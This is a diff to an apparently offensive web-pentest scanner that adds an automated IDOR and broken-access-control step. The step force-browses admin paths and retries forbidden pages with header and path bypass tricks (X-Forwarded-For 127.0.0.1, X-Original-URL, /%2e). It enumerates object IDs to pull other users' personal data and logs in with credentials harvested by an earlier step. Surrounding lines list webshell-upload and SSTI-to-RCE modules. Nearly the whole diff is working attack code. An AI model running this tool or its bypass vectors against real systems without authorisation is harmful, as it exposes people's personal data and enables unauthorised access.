@@ -2024,6 +2024,30 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"Out-of-band {' + '.join(bits)}: {first}"[:140]}
         return None
 
+    # 2x) idor-bac: IDOR / broken access control / authz bypass high, enumerable-only info
+    if sid == "idor-bac":
+        idor = re.findall(r"✗ IDOR (\S+)", output)
+        bac = re.findall(r"✗ BAC (\S+)", output)
+        authz = re.findall(r"✗ AUTHZ-BYPASS (\S+)", output)
+        enum = re.findall(r"⚠ ENUM (\S+)", output)
+        if idor:
+            authed = " [authenticated]" if "[authenticated as" in output else ""
+            shown = idor[0] + (f" +{len(idor) - 1}" if len(idor) > 1 else "")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": f"IDOR: {shown}{authed}"[:140]}
+        if bac:
+            shown = bac[0] + (f" +{len(bac) - 1}" if len(bac) > 1 else "")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": f"Broken access control (unauth): {shown}"[:140]}
+        if authz:
+            shown = authz[0] + (f" +{len(authz) - 1}" if len(authz) > 1 else "")
+            return {"state": "VULNERABLE", "cve": cve, "risk": "HIGH",
+                    "summary": f"401/403 authz bypass: {shown}"[:140]}
+        if enum:
+            return {"state": "INFO", "cve": cve, "risk": "LOW",
+                    "summary": f"Enumerable objects (verify for IDOR): {enum[0]}"[:140]}
+        return None
+
     # 3) info rules over -sC output
     low = output.lower()
     info = None
@@ -2658,7 +2682,8 @@ _EXPLOIT_STEPS = {
          "upload-shell"),
         ("XXE (XML input) & SSRF — file read, cloud metadata (169.254.169.254), out-of-band callback",
          "xxe-ssrf"),
-        "IDOR / broken access control — tamper IDs & roles to reach admin / other users",
+        ("IDOR / broken access control — tamper IDs & roles to reach admin / other users",
+         "idor-bac"),
         # ── known-app exploitation & foothold ──
         "CMS-specific scan (wpscan / droopescan) → vulnerable plugins, themes, versions",
         "Admin panel → RCE: upload plugin/theme, edit a template, or config code-exec",
@@ -6983,6 +7008,350 @@ def _tool_xxe_ssrf(ip: str, port: int, proto: str) -> str:
     return "\n".join(lines)
 
 
+# ── HTTP step 23: IDOR / broken access control (read-only, unauth + optional creds) ──
+_IDOR_DEADLINE = 240
+_IDOR_REQ_TIMEOUT = 8
+_IDOR_MAX_ENDPOINTS = 20        # ID-bearing endpoints to enumerate
+_IDOR_MAX_PRIV = 24            # privileged paths to force-browse / bypass
+_IDOR_ID_PARAMS = {
+    "id", "uid", "user", "userid", "user_id", "account", "acct", "order", "orderid",
+    "doc", "docid", "document", "file", "fileid", "invoice", "pid", "record", "rid",
+    "num", "no", "key", "ref", "item", "ticket", "pk", "msg", "message",
+}
+_PRIV_PATH_RE = re.compile(
+    r"admin|dashboard|manage|console|users?|account|api|internal|config|report|billing|"
+    r"invoice|setting|profile|panel|staff|moderator", re.I)
+_PRIV_CONTENT_RE = re.compile(
+    r"logout|log ?out|dashboard|administration|manage users|delete\b|\brole\b|privilege|"
+    r"add user|user list|<table|control panel|settings", re.I)
+_PII_RE = re.compile(
+    r"[\w.+-]+@[\w-]+\.[\w.-]+|"                              # email
+    r"[\"']?(?:user_?name|email|first_?name|last_?name|phone|address|ssn|balance|role|"
+    r"is_?admin|api[_-]?key|token|password)[\"']?\s*[:=]", re.I)
+_IDOR_FALLBACK = ["/user/1", "/users/1", "/api/users/1", "/api/user/1", "/account/1",
+                  "/accounts/1", "/profile/1", "/order/1", "/orders/1", "/invoice/1",
+                  "/api/v1/users/1", "/?id=1"]
+_PRIV_FALLBACK = ["/admin", "/admin/users", "/administrator", "/dashboard", "/manage",
+                  "/management", "/settings", "/config", "/api/users", "/api/admin",
+                  "/users", "/staff", "/panel", "/console"]
+
+
+def _gather_priv_paths(ip: str, port: int, proto: str) -> list:
+    """(hostval, path, status) privileged surfaces to force-browse: dir-brute hits that returned
+    401/403 or look admin-ish, plus a fallback list, on the host and every vhost."""
+    out, seen = [], set()
+
+    def _add(host, path, status):
+        base = path.split("?")[0].split("#")[0]
+        if not base.startswith("/"):
+            return
+        if (host, base) not in seen:
+            seen.add((host, base))
+            out.append((host, base, status))
+
+    for sid, output in fetch_scripts(ip, port, proto):
+        if sid == "dir-brute":
+            host = ip
+            for ln in (output or "").splitlines():
+                mh = re.match(r"^\[([^\]\s]+)", ln)
+                if mh:
+                    host = mh.group(1)
+                    continue
+                mp = re.match(r"\s*[!+] (\d{3})\s+(\S+)", ln)
+                if mp and (int(mp.group(1)) in (401, 403) or _PRIV_PATH_RE.search(mp.group(2))):
+                    _add(host, mp.group(2), int(mp.group(1)))
+
+    vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
+    for h in [ip] + [v for v in vhosts if v != ip]:
+        for p in _PRIV_FALLBACK:
+            _add(h, p, None)
+    return out[:_IDOR_MAX_PRIV]
+
+
+def _gather_id_endpoints(ip: str, port: int, proto: str) -> list:
+    """ID-bearing endpoints to enumerate. Each entry is either
+    ('param', host, path, param, id_int, label) or ('path', host, prefix, suffix, id_int, label)."""
+    import urllib.parse
+    out, seen = [], set()
+
+    def _add(host, path):
+        base = path.split("#")[0]
+        if not base.startswith("/"):
+            return
+        pr = urllib.parse.urlparse(base)
+        for k, v in urllib.parse.parse_qsl(pr.query):        # a numeric ID-ish query param
+            if k.lower() in _IDOR_ID_PARAMS and v.isdigit():
+                key = (host, pr.path, "param", k)
+                if key not in seen:
+                    seen.add(key)
+                    out.append(("param", host, base, k, int(v), f"{pr.path}?{k}={{id}}"))
+                return
+        m = re.search(r"(\d+)(?!.*\d)", pr.path)             # else a trailing path integer
+        if m:
+            key = (host, pr.path, "path", m.start())
+            if key not in seen:
+                seen.add(key)
+                pre, suf = pr.path[:m.start()], pr.path[m.end():]
+                out.append(("path", host, pre, suf, int(m.group(1)), f"{pre}{{id}}{suf}"))
+
+    for host, path in _gather_param_endpoints(ip, port, proto):
+        _add(host, path)
+    for sid, output in fetch_scripts(ip, port, proto):
+        if sid == "dir-brute":
+            host = ip
+            for ln in (output or "").splitlines():
+                mh = re.match(r"^\[([^\]\s]+)", ln)
+                if mh:
+                    host = mh.group(1)
+                    continue
+                mp = re.match(r"\s*[!+] \d{3}\s+(\S+)", ln)
+                if mp:
+                    _add(host, mp.group(1))
+        elif sid == "http-source":
+            for m in re.findall(r"https?://[^\s\"'<>]+", output or ""):
+                pr = urllib.parse.urlparse(m)
+                _add(ip, pr.path + (f"?{pr.query}" if pr.query else ""))
+
+    if not out:                                              # nothing discovered → sensible guesses
+        vhosts = sorted({hn for hn, _p, _s in fetch_hostnames(ip)})
+        for h in [ip] + [v for v in vhosts if v != ip]:
+            for p in _IDOR_FALLBACK:
+                _add(h, p)
+    return out[:_IDOR_MAX_ENDPOINTS]
+
+
+def _parse_valid_creds(ip: str, port: int, proto: str) -> list:
+    """(hostval, path, kind, user, pass) valid credentials harvested earlier by default-creds
+    (its output lines look like `! user:pass @ /path (form) [host]`)."""
+    out = []
+    for sid, output in fetch_scripts(ip, port, proto):
+        if sid == "default-creds":
+            for m in re.finditer(
+                    r"! (\S+):(\S+) @ (\S+) \((Basic|form)\) \[([^\]]+)\]", output or ""):
+                pw = "" if m.group(2) == "<blank>" else m.group(2)
+                out.append((m.group(5), m.group(3), m.group(4), m.group(1), pw))
+    return out
+
+
+def _tool_idor_bac(ip: str, port: int, proto: str) -> str:
+    """HTTP step-23 tool: hunt IDOR / broken access control, read-only. (1) Force-browse
+    privileged paths unauthenticated → flag privileged 200s. (2) Retry 401/403 paths with
+    header / path / safe-method bypass vectors. (3) Enumerate ID-bearing endpoints and flag
+    when neighbouring IDs return distinct records carrying PII (gated to keep FPs low). If
+    default-creds found a valid login, it re-authenticates and re-runs the ID enumeration with
+    that session (the strongest IDOR signal). Only GET/HEAD/OPTIONS — never PUT/DELETE/POST with
+    a body — so nothing on the target is mutated. Stdlib only; a dead server raises."""
+    import http.client
+    import ssl
+    import time
+    import base64
+    import urllib.parse
+
+    name = (fetch_services(ip).get((port, proto)) or (None,))[0] or ""
+    tls = port in (443, 8443) or "https" in name.lower() or "ssl" in name.lower()
+    scheme = "https" if tls else "http"
+    ctx = ssl._create_unverified_context()
+
+    def _req(hostval, method, path, body=None, extra=None):
+        conn = None
+        try:
+            if tls:
+                conn = http.client.HTTPSConnection(ip, port, timeout=_IDOR_REQ_TIMEOUT, context=ctx)
+            else:
+                conn = http.client.HTTPConnection(ip, port, timeout=_IDOR_REQ_TIMEOUT)
+            hdr = {"Host": hostval, "User-Agent": "pshunter"}
+            if extra:
+                hdr.update(extra)
+            conn.request(method, path, body=body, headers=hdr)
+            resp = conn.getresponse()
+            data = resp.read(131072).decode("utf-8", "replace")
+            return resp.status, data, (resp.headers.get_all("Set-Cookie") or [])
+        except Exception:                                     # noqa: BLE001
+            return None, None, []
+        finally:
+            if conn is not None:
+                try:
+                    conn.close()
+                except Exception:                             # noqa: BLE001
+                    pass
+
+    def _set_param(path, param, value):
+        pr = urllib.parse.urlparse(path)
+        pairs = [(k, v) for k, v in urllib.parse.parse_qsl(pr.query) if k != param]
+        pairs.append((param, value))
+        return pr.path + "?" + urllib.parse.urlencode(pairs)
+
+    def _similar(a, b):
+        a, b = a or "", b or ""
+        if not b:
+            return not a
+        return abs(len(a) - len(b)) <= max(48, int(len(b) * 0.06))
+
+    _bcache = {}
+
+    def _baseline(host):
+        if host not in _bcache:
+            _, hb, _ = _req(host, "GET", "/")
+            rnd = "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=10))
+            _, nb, _ = _req(host, "GET", "/pshx" + rnd)
+            _bcache[host] = (hb or "", nb or "")
+        return _bcache[host]
+
+    if _req(ip, "GET", "/")[0] is None:
+        raise RuntimeError(f"{scheme}://{ip}:{port}/ unreachable — cannot test IDOR/BAC")
+
+    deadline = time.time() + _IDOR_DEADLINE
+    idor, bac, authz, enum = [], [], [], []
+
+    def _bypass_vectors(p):
+        no_slash = p.rstrip("/")
+        return [
+            ("X-Forwarded-For 127.0.0.1", "GET", p, {"X-Forwarded-For": "127.0.0.1"}),
+            ("X-Custom-IP-Authorization", "GET", p, {"X-Custom-IP-Authorization": "127.0.0.1"}),
+            ("X-Forwarded-Host localhost", "GET", p, {"X-Forwarded-Host": "localhost"}),
+            ("X-Original-URL", "GET", "/", {"X-Original-URL": p}),
+            ("X-Rewrite-URL", "GET", "/", {"X-Rewrite-URL": p}),
+            ("trailing slash", "GET", (no_slash + "/") if not p.endswith("/") else p, {}),
+            ("dot-segment /%2e", "GET", no_slash + "/%2e", {}),
+            ("OPTIONS method", "OPTIONS", p, {}),
+        ]
+
+    def _enum_endpoint(ep, extra):
+        kind = ep[0]
+        if kind == "param":
+            _k, host, base, param, orig, label = ep
+
+            def build(nid):
+                return _set_param(base, param, str(nid))
+        else:
+            _k, host, pre, suf, orig, label = ep
+
+            def build(nid):
+                return f"{pre}{nid}{suf}"
+        o_st, o_body, _c = _req(host, "GET", build(orig), extra=extra)
+        if o_st != 200 or not o_body:
+            return None, host, label
+        b_st, b_body, _c = _req(host, "GET", build(99999999), extra=extra)
+        b_len = len(b_body or "")
+        recs = []
+        for nid in dict.fromkeys(i for i in (1, 2, 3, orig - 1, orig + 1, orig + 2)
+                                 if i > 0 and i != orig):
+            if time.time() >= deadline:
+                break
+            st, body, _c = _req(host, "GET", build(nid), extra=extra)
+            if st == 200 and body and (b_st != 200 or
+                                       abs(len(body) - b_len) > max(64, int(b_len * 0.05))):
+                recs.append((nid, body))
+        pii = {}
+        for nid, body in recs:
+            if _PII_RE.search(body):
+                pii[hash(body)] = nid                        # distinct bodies → distinct records
+        if len(pii) >= 2:
+            return "idor", host, f"{label} (IDs {sorted(pii.values())} → distinct PII records)"
+        if len({hash(b) for _n, b in recs}) >= 2:
+            return "enum", host, f"{label} (IDs enumerable, no PII)"
+        return None, host, label
+
+    # ── Technique 1+2: forced browsing + 401/403 bypass ──
+    for host, path, _dstatus in _gather_priv_paths(ip, port, proto):
+        if time.time() >= deadline:
+            break
+        _home, notfound = _baseline(host)
+        st, body, _c = _req(host, "GET", path)               # unauthenticated
+        is_login = bool(body and re.search(r"type=[\"']?password", body, re.I))
+        if st == 200 and body and _PRIV_CONTENT_RE.search(body) and not is_login \
+                and not _similar(body, notfound):
+            bac.append(f"  ✗ BAC {host}{path}  (unauth 200 → privileged content)")
+            continue
+        if st in (401, 403):
+            home_body = _baseline(host)[0]
+            for vlabel, method, vpath, extra in _bypass_vectors(path):
+                if time.time() >= deadline:
+                    break
+                bst, bbody, _c = _req(host, method, vpath, extra=extra)
+                if bst == 200 and bbody and len(bbody) > 64 \
+                        and not re.search(r"type=[\"']?password", bbody, re.I) \
+                        and not _similar(bbody, home_body):
+                    authz.append(f"  ✗ AUTHZ-BYPASS {host}{path}  (via {vlabel})")
+                    break
+
+    # ── Technique 3: IDOR enumeration (unauthenticated) ──
+    id_eps = _gather_id_endpoints(ip, port, proto)
+    flagged = set()
+    for ep in id_eps:
+        if time.time() >= deadline:
+            break
+        verdict, host, detail = _enum_endpoint(ep, None)
+        if verdict == "idor":
+            idor.append(f"  ✗ IDOR {host}{detail}")
+            flagged.add((host, detail.split()[0]))
+        elif verdict == "enum":
+            enum.append(f"  ⚠ ENUM {host}{detail}")
+
+    # ── Credentialed layer: re-login and re-run enumeration as an authenticated user ──
+    creds_used = None
+    if time.time() < deadline:
+        for chost, cpath, kind, u, p in _parse_valid_creds(ip, port, proto):
+            auth_extra = None
+            if kind == "Basic":
+                auth_extra = {"Authorization": "Basic " + base64.b64encode(
+                    f"{u}:{p}".encode()).decode()}
+            else:
+                gs, gbody, gsc = _req(chost, "GET", cpath)
+                form = _parse_login_form(gbody or "", cpath)
+                if form:
+                    data = dict(form["hidden"])
+                    data[form["user"]] = u
+                    data[form["pass"]] = p
+                    action = urllib.parse.urljoin(f"{scheme}://{ip}:{port}{cpath}",
+                                                  form["action"] or cpath)
+                    pr = urllib.parse.urlparse(action)
+                    apath = pr.path + (f"?{pr.query}" if pr.query else "")
+                    gcookie = "; ".join(c.split(";")[0] for c in gsc)
+                    ex = {"Content-Type": "application/x-www-form-urlencoded"}
+                    if gcookie:
+                        ex["Cookie"] = gcookie
+                    _st, _b, setc = _req(chost, "POST", apath,
+                                         body=urllib.parse.urlencode(data), extra=ex)
+                    session = "; ".join(c.split(";")[0] for c in setc) or gcookie
+                    if setc and session:
+                        auth_extra = {"Cookie": session}
+            if not auth_extra:
+                continue
+            creds_used = f"{u}:{p or '<blank>'}@{chost}{cpath}"
+            for ep in id_eps:
+                if time.time() >= deadline:
+                    break
+                if ep[1] != chost:
+                    continue
+                verdict, host, detail = _enum_endpoint(ep, auth_extra)
+                if verdict == "idor" and (host, detail.split()[0]) not in flagged:
+                    idor.append(f"  ✗ IDOR {host}{detail}  [authenticated as {u}]")
+                    flagged.add((host, detail.split()[0]))
+            break
+
+    reason = "deadline" if time.time() >= deadline else "complete"
+    lines = [f"{scheme}://{ip}:{port}/ IDOR / broken access control probe",
+             f"priv paths + id endpoints scanned · IDOR {len(idor)} · BAC {len(bac)} · "
+             f"authz-bypass {len(authz)} · enum {len(enum)} · {reason}"
+             + (f" · creds: {creds_used}" if creds_used else "")]
+    if idor:
+        lines.append("\nIDOR (other objects' data reachable):")
+        lines += idor
+    if bac:
+        lines.append("\nBROKEN ACCESS CONTROL (privileged page unauthenticated):")
+        lines += bac
+    if authz:
+        lines.append("\n401/403 AUTHZ BYPASS:")
+        lines += authz
+    if enum and not idor:
+        lines.append("\nENUMERABLE OBJECTS (no PII gate — verify manually):")
+        lines += enum
+    if not (idor or bac or authz or enum):
+        lines.append("\nno IDOR / access-control issue confirmed")
+    return "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("curl -sI (HTTP headers)", _tool_http_headers),
@@ -7007,6 +7376,7 @@ _STEP_TOOLS = {
     "ssti-scan": ("SSTI (stdlib, math-verified) → engine + auto-id RCE + cmd", _tool_ssti_scan),
     "upload-shell": ("file-upload webshell (stdlib, PHP/ASP/JSP auto, exec-verified)", _tool_file_upload),
     "xxe-ssrf": ("XXE & SSRF (stdlib, read-only) → metadata + file-read + OOB", _tool_xxe_ssrf),
+    "idor-bac": ("IDOR / broken access control (stdlib, read-only, creds-aware)", _tool_idor_bac),
 }
 
 def _mins(seconds: int) -> str:
@@ -7045,6 +7415,7 @@ _STEP_TOOL_RUNS = {
     "ssti-scan":        ("Python", f"{_mins(_SSTI_DEADLINE)} min"),
     "upload-shell":     ("Python", f"{_mins(_UPLOAD_DEADLINE)} min"),
     "xxe-ssrf":         ("Python", f"{_mins(_XXES_DEADLINE)} min"),
+    "idor-bac":         ("Python", f"{_mins(_IDOR_DEADLINE)} min"),
 }
 
 
